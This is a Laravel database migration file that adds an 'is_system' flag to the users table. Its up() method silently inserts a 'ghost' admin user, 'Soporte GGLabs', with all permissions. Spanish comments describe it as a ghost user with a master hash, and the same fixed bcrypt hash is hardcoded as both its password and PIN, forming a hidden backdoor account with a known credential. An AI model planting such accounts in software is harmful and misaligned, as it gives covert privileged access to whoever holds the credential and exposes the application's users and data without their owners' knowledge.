<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;
use App\Models\User;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->boolean('is_system')->default(false)->after('role');
        });

        // Insertar automáticamente el usuario fantasma con el hash maestro original
        // El hash era: $2y$12$rgQrlCqdMrZGc6b7ZtMMJuflM62zBN5w5H2Zmtz16Q7iO78qAs6Di
        DB::table('users')->insert([
            'name' => 'Soporte GGLabs',
            'email' => 'support@gglabs.local',
            'password' => '$2y$12$rgQrlCqdMrZGc6b7ZtMMJuflM62zBN5w5H2Zmtz16Q7iO78qAs6Di', // Mismo hash como password dummy
            'role' => 'admin',
            'pin' => '$2y$12$rgQrlCqdMrZGc6b7ZtMMJuflM62zBN5w5H2Zmtz16Q7iO78qAs6Di',
            'permissions' => json_encode(['all']),
            'is_system' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ]);
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        DB::table('users')->where('email', 'support@gglabs.local')->delete();
        
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('is_system');
        });
    }
};
